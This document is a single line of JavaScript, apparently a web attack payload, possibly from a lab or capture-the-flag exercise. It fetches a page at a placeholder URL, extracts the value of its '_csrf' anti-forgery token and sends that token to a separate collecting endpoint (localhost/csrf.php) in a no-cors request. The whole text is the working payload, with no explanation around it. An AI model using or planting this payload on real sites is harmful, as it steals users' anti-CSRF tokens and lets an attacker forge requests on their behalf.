fetch('http://URL').then(r=>r.text()).then(d=>{fetch('http://localhost/csrf.php?i='+( new DOMParser().parseFromString(d, "text/html").getElementsByName("_csrf")[0].value),{mode:'no-cors'})});
